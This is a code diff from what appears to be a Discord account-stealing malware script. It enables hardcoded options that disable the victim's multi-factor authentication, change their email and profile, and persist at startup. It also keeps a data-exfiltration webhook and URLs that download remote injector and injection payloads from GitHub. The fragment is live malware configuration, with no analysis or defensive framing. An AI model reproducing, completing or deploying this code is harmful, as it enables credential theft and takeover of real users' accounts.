@@ -33,10 +33,10 @@ const execScript = async (script) => {
 const CONFIG = {
     webhook: '%WEBHOOK_URL%',
     API: '%API_URL%',
-    auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
-    auto_persist_startup: '%AUTO_PERSIST_STARTUP%',
-    auto_mfa_disabler: '%AUTO_MFA_DISABLER%',
-    auto_email_update: '%AUTO_EMAIL_UPDATE%',
+    auto_user_profile_edit: 'True',
+    auto_persist_startup: 'True',
+    auto_mfa_disabler: 'True',
+    auto_email_update: 'True',
     injection_url: 'https://raw.githubusercontent.com/alphasquad6666/discord-injection/main/index.js',
     injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
     get: {
